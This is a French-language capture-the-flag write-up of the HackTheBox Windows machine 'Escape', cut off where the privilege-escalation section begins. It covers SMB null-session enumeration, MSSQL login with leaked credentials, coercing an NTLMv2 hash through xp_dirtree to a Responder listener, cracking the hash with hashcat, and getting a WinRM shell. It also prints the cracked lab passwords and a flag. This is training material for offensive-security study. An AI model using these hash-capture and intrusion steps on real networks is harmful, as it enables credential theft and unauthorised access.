---
title: "Windows Box : Escape"
date: 2023-06-15
comment: true
tags: ["Pentest", "HackTheBox"]
---

## Introduction

Cette box était une machine windows de niveau medium qui permettait de privec en utilisant une vulnérabilité de type `ESC1`!
On va commencer tout de suite en lançant un scan nmap comme pour toutes les box HTB.

## Reconnaissance

### Scans

Le scan présente bien toutes les caractéristiques d'un `Domain Controller`, on y voit les ports `445` et `139` pour le smb, le port `88` pour le ``Kerberos 5 ticket service` et le service DNS habituel:

```txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 04:53 EDT
Nmap scan report for 10.10.11.202
Host is up (0.028s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-14 16:53:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-05-14T16:54:51+00:00; +8h00m12s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-05-13T20:58:31
|_Not valid after:  2053-05-13T20:58:31
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-05-14T16:54:51+00:00; +8h00m12s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m12s, deviation: 0s, median: 8h00m12s
| smb2-time: 
|   date: 2023-05-14T16:54:11
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.07 seconds
```

On remarque aussi un serveur `MSSQL` sur le port `1433`.

Après avoir simplement essayé de se connecter au serveur smb et rajouté le nom de domaine du DC dans notre hostfile, On va essayer de se connecter au smb en `NULL Authentication` avec crackmapexec. Il s'avère que pour que la NULL Authentication fonctionne il faut que le nom d'utilisateur ne soit pas existant sur la machine, on peut prendre un nom aléatoire et essayer de lister les shares disponibles:

```txt
cme smb 10.10.11.202 --shares -u 'g' -p ''    
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\g: 
SMB         10.10.11.202    445    DC               [+] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```
Ok visiblement on a accès en lecture à une share inhabituelle: `Public`. On va maintenant utiliser `smbclient` pour lister les fichiers disponibles dessus:

```txt
smbclient -N -U 'g' //10.10.11.202/Public
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1462488 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (306.3 KiloBytes/sec) (average 306.3 KiloBytes/sec)
smb: \> exit
```

Jetons un oeil au PDF que nous venons de récupérer:

<div>
    <img src="assets/PDF_bonus.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
</div>

A la fin de ce dernier on tombe sur des creds de la base de données, destinés au nouveaux arrivants.

### Accès à la base de données

Pour se connecter à une base de données MSSQL sous linux il est possible d'utiliser `sqsh` ou l'utilitaire proposé par `Impacket`, ce que nous allons faire ici:

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> SELECT name FROM master.dbo.sysdatabases;
name                                                                                                                               

--------------------------------------------------------------------------------------------------------------------------------   

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb
```

## Obtention des premiers creds

Ok donc il n'y a que les bases de données par défault de MSSQL, cela ne sert à rien d'aller chercher à l'intérieur. Maintenant il va nous falloir d'obtenir les creds du compte sur lequel tourne le serveur ou arriver à RCE tout de suite.

### Relay attack sur le compte MSSQL

Malheureusement la commande `xp_cmdshell` permettant d'exécuter des commandes n'est pas accessible, après quelque recherches on tombe sur une méthode d'exploitation qui permet de mettre en place une `Relay attack` à partir d'un accès MSSQL: En utilisant la commande `xp_dirtree` qui permet d'accéder à une resssource distante.

En effet si on fait en sorte que le serveur fasse une requete SMB vers un serveur que l'on contrôle, pour s'authentifier il enverra son hash `NTLMv2` que nous pourrons cracker en offline. On va donc lancer notre serveur SMB avec l'outil `Responder` sur l'interface connectée au VPN comme ceci:

```txt
sudo responder -I tun0
```

On lance ensuite la requete SMB vers notre machine depuis le serveur MSSQL:

```txt
SQL> xp_dirtree '\\10.10.14.34\test'
```

Et on obtient les hash du compte `sql_svc` sur lequel tourne le serveur:

```txt
[+] Listening for events...                                                                                                                                                                                        

[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:8795c31e953d3cb4:FA875D8F149BE0462933AF6BC3AEB7CB:01010000000000000003A987799FD901ECF16D600E6BBEFB00000000020008004F0043004F00590001001E00570049004E002D00340038004F0039004E0057003700420039004F004B0004003400570049004E002D00340038004F0039004E0057003700420039004F004B002E004F0043004F0059002E004C004F00430041004C00030014004F0043004F0059002E004C004F00430041004C00050014004F0043004F0059002E004C004F00430041004C00070008000003A987799FD90106000400020000000800300030000000000000000000000000300000F13673A0A84F1123BC030B1965AC9686C878500990100A183A4A1D42B4336C9F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330034000000000000000000
```

Et il ne reste plus qu'à le cracker avec hashcat:

```txt
hashcat -m 5600 sql_hash.txt /usr/share/wordlists/rockyou.txt
...
SQL_SVC::sequel:8795c31e953d3cb4:fa875d8f149be0462933af6bc3aeb7cb:01010000000000000003a987799fd901ecf16d600e6bbefb00000000020008004f0043004f00590001001e00570049004e002d00340038004f0039004e0057003700420039004f004b0004003400570049004e002d00340038004f0039004e0057003700420039004f004b002e004f0043004f0059002e004c004f00430041004c00030014004f0043004f0059002e004c004f00430041004c00050014004f0043004f0059002e004c004f00430041004c00070008000003a987799fd90106000400020000000800300030000000000000000000000000300000f13673a0a84f1123bc030b1965ac9686c878500990100a183a4a1d42b4336c9f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330034000000000000000000:REGGIE1234ronnie
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:8795c31e953d3cb4:fa875d8f149be04629...000000
Time.Started.....: Thu Jun 15 11:21:43 2023 (14 secs)
Time.Estimated...: Thu Jun 15 11:21:57 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   755.7 kH/s (1.59ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10700800/14344385 (74.60%)
Rejected.........: 0/10700800 (0.00%)
Restore.Point....: 10698752/14344385 (74.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: REPIN210 -> REDOCEAN22
Hardware.Mon.#1..: Util: 62%

Started: Thu Jun 15 11:21:42 2023
Stopped: Thu Jun 15 11:21:58 2023
```

## Obtention du foothold sur le Domain controller

Nickel! Maintenant il va nous falloir RCE sur le DC, on peut commencer par voir si le service `WinRM` est utilisé par le DC:

```txt
cme winrm 10.10.11.202                                                                       
SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
```

`WSMan` est utilisé donc `WinRM` doit l'être aussi, on va tenter de se connecter avec evil-winrm sur le compte `sql_svc`:

```txt
evil-winrm -u sql_svc -p REGGIE1234ronnie -i 10.10.11.202     

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

Et on obtient notre premier shell sur le DC en tant que `sql_svc`.

## Pivoting puis privesc

### Pivoting

En fouillant à la racine du disque on trouve un dossier `SQLServer` contenant des Logs et dans l'une d'elle quelque chose d'assez intéressant:

```txt
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
```

L'utilisateur `Ryan.Cooper` a essayé de se connecter et c'est trompé en mettant son mot de passe à la place de son nom d'utilisateur, on va pouvoir pivoter sur son compte.

Une fois connecté en tant que Ryan, on peut récupérer le premier flag sur son bureau: `2f60dd9b4e3e3deeec9373f3c70a1011`.

### Privesc

Comme suggéré par le nom du challenge (`ESCcape`), on va s'intéresser à cette branche là des 